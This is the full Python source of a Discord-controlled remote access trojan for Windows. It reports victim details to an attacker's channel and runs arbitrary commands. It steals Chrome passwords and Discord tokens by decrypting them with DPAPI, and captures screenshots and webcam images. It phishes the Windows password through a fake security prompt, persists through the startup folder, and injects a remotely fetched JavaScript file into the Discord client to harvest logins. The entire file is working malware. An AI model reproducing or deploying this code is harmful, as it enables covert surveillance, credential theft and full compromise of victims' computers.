import os
import shutil
import subprocess
import pyautogui
import socket
from discord import Intents, Client, Message, File, Guild, TextChannel
from discord_webhook import DiscordWebhook
from requests import get
import cv2
from time import sleep
import webbrowser
import ctypes
import pyttsx3
from pynput import keyboard
import win32clipboard
import base64
from base64 import b64decode
from Crypto.Cipher import AES
import win32crypt
from win32crypt import CryptUnprotectData
from os import getlogin, listdir
from json import loads
from re import findall
from urllib.request import Request, urlopen
from subprocess import Popen, PIPE
import requests
import json
from datetime import datetime
from zipfile import ZipFile
import sqlite3
from datetime import timezone, timedelta
from PIL import ImageGrab
import time
import httpx
import winshell
import sys
import psutil
import tkinter as tk
from tkinter import simpledialog
import glob


startup = winshell.startup()

ownFileName = os.path.basename(sys.argv[0])

ownFilePath = os.getcwd()



channel_count = None
name = os.getlogin()
hostname = socket.gethostname()
ip = get('https://api.ipify.org').content.decode('utf8')
APPDATA_ROAMING = os.getenv('APPDATA')


import wmi

TOKEN = "BOT_TOKEN"


intents: Intents = Intents.default()
intents.message_content = True
client: Client = Client(intents=intents)


DETACHED_PROCESS = 0x00000008


def showReqPass():
    root = tk.Tk()
    root.withdraw()  # Verstecke das Hauptfenster
    root.overrideredirect(True)  # Entfernen Sie das Standard-Icon in der Titelleiste

    # Eingabefenster anzeigen und modal machen
    user_input = simpledialog.askstring("Sicherheitsüberprüfung", "Bitte geben Sie Ihren Windows-Code ein, um fortzufahren")

    # Nachricht anzeigen
    if user_input:
        return user_input
    else:
        return showReqPass()

tokens = []
cleaned = []
checker = []

userprofile = os.getenv('USERPROFILE')

def decrypt(buff, master_key):
    try:
        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except:
        return "Error"

def get_token():
    already_check = []
    checker = []
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    chrome = local + "\\Google\\Chrome\\User Data"
    paths = {
        'Discord': roaming + '\\discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Lightcord': roaming + '\\Lightcord',
        'Discord PTB': roaming + '\\discordptb',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
        'Amigo': local + '\\Amigo\\User Data',
        'Torch': local + '\\Torch\\User Data',
        'Kometa': local + '\\Kometa\\User Data',
        'Orbitum': local + '\\Orbitum\\User Data',
        'CentBrowser': local + '\\CentBrowser\\User Data',
        '7Star': local + '\\7Star\\7Star\\User Data',
        'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
        'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
        'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
        'Chrome': chrome + 'Default',
        'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
        'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Defaul',
        'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Iridium': local + '\\Iridium\\User Data\\Default'
    }
    for platform, path in paths.items():
        if not os.path.exists(path): continue
        try:
            with open(path + f"\\Local State", "r") as file:
                key = loads(file.read())['os_crypt']['encrypted_key']
                file.close()
        except: continue
        for file in listdir(path + f"\\Local Storage\\leveldb\\"):
            if not file.endswith(".ldb") and file.endswith(".log"): continue
            else:
                try:
                    with open(path + f"\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
                        for x in files.readlines():
                            x.strip()
                            for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                                tokens.append(values)
                except PermissionError: continue
        for i in tokens:
            if i.endswith("\\"):
                i.replace("\\", "")
            elif i not in cleaned:
                cleaned.append(i)
        for token in cleaned:
            try:
                tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
            except IndexError == "Error": continue
            checker.append(tok)
            for value in checker:
                if value not in already_check:
                    already_check.append(value)
                    headers = {'Authorization': tok, 'Content-Type': 'application/json'}
                    try:
                        res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
                    except: continue
                    if res.status_code == 200:
                        res_json = res.json()
                        email = res_json['email']
                        phone = res_json['phone']
                        mfa_enabled = res_json['mfa_enabled']
                        has_nitro = False
                        res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
                        nitro_data = res.json()
                        has_nitro = bool(len(nitro_data) > 0)
                        days_left = 0
                        if has_nitro:
                            d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                            d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                            days_left = abs((d2 - d1).days)


                        return f"""```Email: {email}
Phone: {phone}
2FA/MFA Enabled: {mfa_enabled}
Nitro: {has_nitro}
Expires in (days): {days_left if days_left else 'None'}
Token: {tok} ```"""
                else: continue



def get_response(user_input: str) -> str:
    text: str = user_input.lower()

    if "!help" in text:
        return f"""```==File==
!dir -> display files in current directory
!cd -> change directory / !cd [path]
!currentdir -> display current direction
!cmd -> execute cmd command and display output / !cmd [command]
!delete -> delete file or folder / !delete [path/file/folder]
!upload -> upload a file to the computer / !upload [filename.***]
!download -> download a file / !download [filename.***]
!zip -> create zip file from folder / !zip [zipFolderName.zip] [folderName]

==Picture==
!screenshot -> get screenshot from current first monitor
!webcampic -> capture webcam picture
!wallpaper -> set desktop wallpaper / !wallpaper (with attachment)

==Tasks==
!listtasks -> list all running processes
!kill -> end a process / !kill process.exe

==Browser==
!chromepass -> get passwords saved in chrome browser
!url -> open a website / !url [website.com]

==PC==
!restart -> restart the pc
!turnoff -> turn pc off
!logoff -> logoff current user
!reqpass -> request windows password

==Other==
!message -> display a message box / !message [text]
!voice -> text to speech / !voice [text message]
!dcinfo -> grab discord info (email, phone, 2fa/mfa info, nitro info, token)
!dcinject -> inject script into discord and get email and password if changed or logged in / !dcinject webhookUrl
```"""
#shutdown -r -t 0
    elif "!cd" in text:
        string = user_input
        say = "!cd "
        if say in string:
            saysplit = string.split(say,1)
            path = saysplit[1]

            os.chdir(path)
        path = os.getcwd()


        return f"```{path}```"

    elif "!restart" in text:

        subprocess.Popen(fr'shutdown -r -t 0', shell=True)


    elif "!turnoff" in text:

        subprocess.Popen(fr'shutdown -s -t 0', shell=True)


    elif "!currentdir" in text:
        return f"```{os.getcwd()}```"
    
    elif "!delete" in text:
        string = user_input
        say = "!delete "
        if say in string:
            saysplit = string.split(say, 1)
            cmd = saysplit[1]

            subprocess.Popen(fr'del {cmd}', shell=True)
            return f"```Command executet!```"
        
    elif "!url" in text.lower():
        string = text
        say = "!url "

        if say in string:
            saysplit = string.split(say,1)
            website = saysplit[1]
            webbrowser.open(website)
            return "```website is open!```"
        
    elif "!kill" in text.lower():
        string = text
        say = "!kill "

        if say in string:
            saysplit = string.split(say,1)
            task = saysplit[1]

            subprocess.Popen(fr"taskkill /IM " + task + " /F", shell=True)
            return "```process killed!```"
        
    elif "!message" in text.lower():
        string = text
        say = "!message "

        if say in string:
            saysplit = string.split(say,1)
            text = saysplit[1]
            ctypes.windll.user32.MessageBoxW(0, f"{text}", " ", 0)
            return "```MessageBox was shown!```"


    elif "!reqpass" in text.lower():
        input = showReqPass()
        return f"```Eingegebenes Passwort: {input}```"
                

    elif "!voice" in text.lower():
        string = text
        say = "!voice "

        if say in string:
            saysplit = string.split(say,1)
            text = saysplit[1]
            
            engine = pyttsx3.init()
            engine.say(text)
            engine.runAndWait()
            return "```Told the message!```"
        
    elif "!zip" in text.lower():
        
        say = "!zip "
        
        if say in text:
            saysplit = text.split(say, 1)
            zipFolderName, folderName = saysplit[1].split()

            subprocess.Popen(fr"tar.exe acvf {zipFolderName} {folderName}", shell=True)
            return f"```created zip folder!```"

    
    elif "!logoff" in text.lower():

        subprocess.Popen(fr'shutdown /l', shell=True)
    elif "!startup" in text.lower():

        subprocess.Popen(fr'move "{ownFilePath}\{ownFileName}" "{startup}"', shell=True)

        return f"```file should be in startup!```"

    elif "!dcinfo" in text.lower():
        kill_discord()

        dcInfo = get_token()
        start_discord()
        return dcInfo
    
        

async def send_message(message: Message, user_message: str, file_path: str = None) -> None:
    if not user_message and not file_path:

        return
    
    if is_private := user_message[0] == "?":
        user_message = user_message[1:]
    
    try:
        response: str = get_response(user_message)

        if is_private:
            if not file_path:
                await message.channel.send(response)
            await message.author.send(response, file=File(file_path))

        if not is_private:
            if not file_path:
                await message.channel.send(response)
            await message.channel.send(response, file=File(file_path))

    except Exception as e:
        pass

channel_count = 0

intents.members = True


@client.event
async def on_ready() -> None:
    global channel_count
    guild: Guild = client.guilds[0]  # Vorausgesetzt, das Skript ist nur auf einem Server aktiv

    # Anzahl der vorhandenen Bot-Befehl-Kanäle zählen
    channel_name = "Bot Commands"
    existing_channels = [c for c in guild.channels if c.name.startswith(channel_name)]
    channel_count = channel_count = len(guild.channels)
    print(channel_count)
    # Neuen Kanal mit aktualisierter Nummer erstellen
    channel = await guild.create_text_channel(name=f"{channel_name} {channel_count}")

    # Webhook für den neuen Kanal erstellen
    webhook = await channel.create_webhook(name="Bot Webhook")

    # Eine Nachricht nur im neuen Kanal mit dem Webhook senden
    message = f"@here User online: __Username: {name}__ | __Ip-Adress: {ip}__ | __Computer-Name: {hostname}__"
    await webhook.send(content=message)

    message = f"!help"
    await webhook.send(content=message)
    print ("Ready")







def chrome_date_and_time(chrome_data): 
    # Chrome_data format is 'year-month-date  
    # hr:mins:seconds.milliseconds 
    # This will return datetime.datetime Object 
    return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data) 
  
  
def fetching_encryption_key(): 
    # Local_computer_directory_path will look  
    # like this below 
    # C: => Users => <Your_Name> => AppData => 
    # Local => Google => Chrome => User Data => 
    # Local State 
    local_computer_directory_path = os.path.join( 
      os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome",  
      "User Data", "Local State") 
      
    with open(local_computer_directory_path, "r", encoding="utf-8") as f: 
        local_state_data = f.read() 
        local_state_data = json.loads(local_state_data) 
  
    # decoding the encryption key using base64 
    encryption_key = base64.b64decode( 
      local_state_data["os_crypt"]["encrypted_key"]) 
      
    # remove Windows Data Protection API (DPAPI) str 
    encryption_key = encryption_key[5:] 
      
    # return decrypted key 
    return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1] 
  
  
def password_decryption(password, encryption_key): 
    try: 
        iv = password[3:15] 
        password = password[15:] 
          
        # generate cipher 
        cipher = AES.new(encryption_key, AES.MODE_GCM, iv) 
          
        # decrypt password 
        return cipher.decrypt(password)[:-16].decode() 
    except: 
          
        try: 
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1]) 
        except: 
            return "No Passwords"
  

local_app_data_path = os.environ['LOCALAPPDATA']

def inject_into_discord(webhook_url):

    discord_session_path = os.path.join(os.environ['APPDATA'], 'Discord')

    for file in os.listdir(discord_session_path):
        file_path = os.path.join(discord_session_path, file)
        try:
            if os.path.isfile(file_path):
                os.unlink(file_path)
        except Exception as e:
            print(f"Fehler beim Löschen der Datei {file_path}: {e}")

    print("Sitzungsdaten wurden gelöscht. Sie müssen sich erneut bei Discord anmelden.")

    path = fr'{local_app_data_path}\Discord\*\modules\discord_desktop_core-*\discord_desktop_core'

    matching_folders = glob.glob(path)

    url = 'https://raw.githubusercontent.com/Paloox/discordInjectionFile/main/injection.js'

    response = requests.get(url)


    file_content = response.text

    if matching_folders:

        target_folder = matching_folders[0]

        new_file_path = os.path.join(target_folder, 'index.js')

        with open(new_file_path, 'w') as file:

            file.write(file_content)



        search_text = "%WEBHOOK_URL_INJECT%"

        replace_text = webhook_url

        with open(new_file_path, 'r') as file:

            data = file.read()

            data = data.replace(search_text, replace_text)



        with open(new_file_path, 'w') as file:

            file.write(data)

        


def start_discord():

    subprocess.Popen(fr"{local_app_data_path}\Discord\Update.exe --processStart Discord.exe", shell=True)


def kill_discord():

    subprocess.Popen("taskkill /F /IM Discord.exe", shell=True)

    


@client.event
async def on_message(message: Message) -> None:
    global channel_count

    if message.author == client.user:
        return
    print(message.channel.name)
    if message.channel.name != f"bot-commands-{channel_count}":
        return
    
    

    username: str = str(message.author)
    user_message: str = message.content
    channel: str = str(message.channel)
    if "!dir" in user_message.lower():
        try:

            subprocess.Popen(r'dir > C:\Windows\Temp\dir.txt', shell=True)
            time.sleep(1)
            await send_message(message, user_message, file_path=r"C:\Windows\Temp\dir.txt")
            time.sleep(1)
            subprocess.Popen(r'del C:\Windows\Temp\dir.txt', shell=True)

        except Exception as e:
            pass
    else:
        await send_message(message, user_message)
    if "!cmd" in user_message.lower():
        string = user_message
        say = "!cmd "
        if say in string:
            saysplit = string.split(say,1)
            command = saysplit[1]
            os.system(command)
            cmd: str = subprocess.check_output(command, shell=True)
            with open(r"C:\Windows\Temp\cmd.txt", "wb") as file:
                file.write(cmd)
            try:
                time.sleep(1)
                await send_message(message, user_message, file_path=r"C:\Windows\Temp\cmd.txt")
                time.sleep(1)
                subprocess.Popen(r'del C:\Windows\Temp\cmd.txt', shell=True)


            except Exception as e:
                pass
    if "!screenshot" in user_message.lower():
        screenshot = pyautogui.screenshot()
        screenshot.save(r'C:\Windows\Temp\screenshot.png')
        try:
            time.sleep(1)
            await send_message(message, user_message, file_path=r"C:\Windows\Temp\screenshot.png")
            time.sleep(1)
            subprocess.Popen(r'del C:\Windows\Temp\screenshot.png', shell=True)

   
        except Exception as e:
            pass
    if "!upload" in user_message.lower():
        string = user_message
        say = "!upload "
        if say in string:
            saysplit = string.split(say,1)
            fileName = saysplit[1]
        try:
            await message.attachments[0].save(fileName)
        except Exception as e:
            pass


    if "!wallpaper" in user_message.lower():

        try:
            await message.attachments[0].save(r"C:\Windows\Temp\wallpaper.png")
            path = r"C:\Windows\Temp\wallpaper.png"
            SPI_SETDESKWALLPAPER = 20
            ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path , 0)

            time.sleep(1)
            subprocess.Popen(r'del C:\Windows\Temp\wallpaper.png', shell=True)
            
        except Exception as e:
            pass
        
        

    if "!listtasks" in user_message.lower():
        f = wmi.WMI()
        with open(r"C:\Windows\Temp\tasks.txt", "w") as file:
            for process in f.Win32_Process():
                file.write(f"{process.ProcessId:<10} {process.Name}\n")  
        if os.path.isfile(r"C:\Windows\Temp\tasks.txt"):
            try:
                await send_message(message, user_message, file_path=r"C:\Windows\Temp\tasks.txt")

                time.sleep(1)
                subprocess.Popen(r'del C:\Windows\Temp\tasks.txt', shell=True)

            except Exception as e:
                await send_message(message, user_message, file_path=r"C:\Windows\Temp\tasks.txt")
    if "!download" in user_message.lower():
        string = user_message
        say = "!download "
        if say in string:
            saysplit = string.split(say,1)
            fileName = saysplit[1]
        try:
            await send_message(message, user_message, file_path=fileName)
        except Exception as e:
            pass
    if "!webcampic" in user_message.lower():
        device_num = 0
        dir_path = r"C:\Windows\Temp"
        basename = "camera_capture"
        ext='jpg'
        interval=1
        cap = cv2.VideoCapture(device_num)
        if not cap.isOpened():
            return
        os.makedirs(dir_path, exist_ok=True)
        base_path = os.path.join(dir_path, basename)
        n = 0
        while True:
            ret, frame = cap.read()
            if not ret:
                break
            cv2.imwrite('{}_{}.{}'.format(base_path, n, ext), frame)
            n += 1
            # Warte für das nächste Bild
            cv2.waitKey(interval * 1000)
            if os.path.isfile(r"C:\Windows\Temp\camera_capture_3.jpg"):

                subprocess.Popen(r'del C:\Windows\Temp\camera_capture_2.jpg', shell=True)

                subprocess.Popen(r'del C:\Windows\Temp\camera_capture_1.jpg', shell=True)

                subprocess.Popen(r'del C:\Windows\Temp\camera_capture_0.jpg', shell=True)

                break
        cap.release()
        fileName = r"C:\Windows\Temp\camera_capture_3.jpg"
        try:
            await send_message(message, user_message, file_path=fileName)
            os.system(f"del {fileName}")
        except Exception as e:
            pass


    if "!chromepass" in user_message.lower():

        key = fetching_encryption_key() 
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", 
                               "Google", "Chrome", "User Data", "default", "Login Data") 
        filename = r"C:\Windows\Temp\ChromePasswords.db"
        shutil.copyfile(db_path, filename) 

        # connecting to the database 
        db = sqlite3.connect(filename) 
        cursor = db.cursor() 

        # 'logins' table has the data 
        cursor.execute( 
            "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
            "order by date_last_used") 

        # iterate over all rows 
        for row in cursor.fetchall(): 
            main_url = row[0] 
            login_page_url = row[1] 
            user_name = row[2] 
            decrypted_password = password_decryption(row[3], key) 
            date_of_creation = row[4] 
            last_usuage = row[5] 

            if user_name or decrypted_password: 

                with open(r"C:\Windows\Temp\passwords.txt", "a") as file:
                    file.write(f"Main URL: {main_url}\n") 
                    file.write(f"Login URL: {login_page_url}\n")
                    file.write(f"User name: {user_name}\n") 
                    file.write(f"Decrypted Password: {decrypted_password}\n") 

            else: 
                continue
            
            if date_of_creation != 86400000000 and date_of_creation: 
                with open(r"C:\Windows\Temp\passwords.txt", "a") as file:
                    file.write(f"Creation date: {str(chrome_date_and_time(date_of_creation))}\n")

            if last_usuage != 86400000000 and last_usuage: 
                with open(r"C:\Windows\Temp\passwords.txt", "a") as file:
                    file.write(f"Last Used: {str(chrome_date_and_time(last_usuage))}\n")  
            with open(r"C:\Windows\Temp\passwords.txt", "a") as file:
                file.write("=" * 100 + "\n")
        cursor.close() 
        db.close() 


        try: 

            # trying to remove the copied db file as  
            # well from local computer 
            os.remove(r"C:\Windows\Temp\ChromePasswords.db") 
        except: 
            pass

        fileName = r"C:\Windows\Temp\passwords.txt"
        try:
            await send_message(message, user_message, file_path=fileName)
            time.sleep(1)
            subprocess.Popen(fr'del {fileName}', shell=True)

        except Exception as e:
            message = "No passwords saved in Chrome"
            await send_message(message, user_message)
            pass


    if "!dcinject" in user_message.lower():
        string = user_message
        say = "!dcinject "
        if say in string:
            saysplit = string.split(say,1)
            webhook = saysplit[1]

            kill_discord()
            inject_into_discord(webhook)
            start_discord()

            message = "Injected!"
            await send_message(message, user_message)








def main() -> None:
    client.run(token=TOKEN)
if __name__ == '__main__':
    main()

